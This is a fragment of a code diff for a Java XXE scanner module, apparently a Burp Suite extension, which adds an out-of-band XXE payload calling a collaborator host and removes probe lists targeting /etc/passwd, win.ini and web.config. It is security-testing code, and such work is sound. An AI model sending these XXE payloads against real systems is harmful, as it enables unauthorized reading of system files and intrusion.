+                        + "<!DOCTYPE root [\n"
+                        + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload2 + "/xxe\">\n"
+                        + "]>\n"
+                        + "<root>&xxe;</root>";
+
+                HttpRequest directOobRequest = original.request()
+                        .withRemovedHeader("Content-Type")
+                        .withAddedHeader("Content-Type", finalAcceptedCt)
+                        .withBody(directOobDtd);
+                try {
+                    HttpRequestResponse directOobResult = api.http().sendRequest(directOobRequest);
+                    sentForceOob2.set(directOobResult);
+                } catch (Exception ignored) {}
+
+                perHostDelay();
+            }
+        }
+    }
+
     // ==================== HELPER METHODS ====================
 
     /**
@@ -2350,19 +2422,6 @@ public class XxeScanner implements ScanModule {
 
     // ==================== TARGET FINGERPRINTING ====================
 
-    /** Minimal probe targets for unknown OS — only files with strong evidence patterns. */
-    private static final String[][] PROBE_LINUX_TARGETS = {
-            {"/etc/passwd", "root:x:0:0:", "/etc/passwd"},
-            {"/proc/version", "Linux version", "/proc/version"},
-            {"/etc/os-release", "NAME=", "/etc/os-release"},
-    };
-
-    private static final String[][] PROBE_WINDOWS_TARGETS = {
-            {"C:/Windows/win.ini", "[fonts]", "C:\\Windows\\win.ini"},
-            {"C:/boot.ini", "[boot loader]", "C:\\boot.ini"},
-            {"C:/inetpub/wwwroot/web.config", "configuration", "C:\\inetpub\\wwwroot\\web.config"},
-    };
-
     /**
      * Inspects response headers and body to determine the target's OS and runtime.
      * Reduces irrelevant requests and false positives by tailoring payloads.
@@ -2440,26 +2499,18 @@ public class XxeScanner implements ScanModule {
 
     /**
      * Returns Linux file targets filtered by fingerprint.
-     * Known Windows → empty. Known Linux → full set. Unknown → minimal probes.
+     * Known Windows → empty. Otherwise → full set (already minimal).
      */
     private String[][] getLinuxTargets(TargetFingerprint fp) {
-        return switch (fp.os) {
-            case WINDOWS -> new String[0][];
-            case LINUX -> LINUX_FILE_TARGETS;
-            case UNKNOWN -> PROBE_LINUX_TARGETS;
-        };
+        return fp.os == DetectedOS.WINDOWS ? new String[0][] : LINUX_FILE_TARGETS;
     }
 
     /**
      * Returns Windows file targets filtered by fingerprint.
-     * Known Linux → empty. Known Windows → full set. Unknown → minimal probes.
+     * Known Linux → empty. Otherwise → full set (already minimal).
      */
     private String[][] getWindowsTargets(TargetFingerprint fp) {
-        return switch (fp.os) {
-            case LINUX -> new String[0][];
-            case WINDOWS -> WINDOWS_FILE_TARGETS;
-            case UNKNOWN -> PROBE_WINDOWS_TARGETS;
-        };
+        return fp.os == DetectedOS.LINUX ? new String[0][] : WINDOWS_FILE_TARGETS;
     }
 
     /**
